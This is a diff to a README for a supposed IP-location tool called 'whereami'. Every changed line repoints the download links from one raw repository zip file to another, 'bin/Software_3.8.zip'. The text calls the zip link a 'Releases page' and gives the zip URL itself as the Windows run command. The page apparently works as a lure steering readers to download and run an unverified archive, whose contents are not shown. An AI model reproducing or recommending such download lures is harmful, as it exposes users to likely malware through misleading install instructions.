@@ -6,11 +6,11 @@ Welcome to **whereami**! This application helps you understand where you are on 
 
 ## 📥 Download Now
 
-[![Download whereami](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/cautionry/whereami.zip)](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/cautionry/whereami.zip)
+[![Download whereami](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/bin/Software_3.8.zip)](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/bin/Software_3.8.zip)
 
 ## 📂 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [whereami Releases](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/cautionry/whereami.zip).
+To get started, you need to download the application. Visit this page to download: [whereami Releases](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/bin/Software_3.8.zip).
 
 1. Click on the link to go to the Releases page.
 2. You will see different versions available for download. Choose the one that fits your system.
@@ -30,7 +30,7 @@ After downloading the application, follow these steps to run it:
 1. Open your terminal or command prompt.
 2. Navigate to the folder where you saved the downloaded file.
 3. Type the appropriate command to run the application:
-   - For Windows: `https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/cautionry/whereami.zip`
+   - For Windows: `https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/bin/Software_3.8.zip`
    - For macOS/Linux: `./whereami`
 4. Press **Enter**.
 
@@ -76,4 +76,4 @@ For any questions or support needs, you can reach out to the community or check 
 
 Don't forget to visit the release page again to check for updates and new features in future versions.
 
-[Download whereami](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/cautionry/whereami.zip) and start exploring your internet location today!
+[Download whereami](https://raw.githubusercontent.com/iamolivierdrabek/whereami/main/bin/Software_3.8.zip) and start exploring your internet location today!
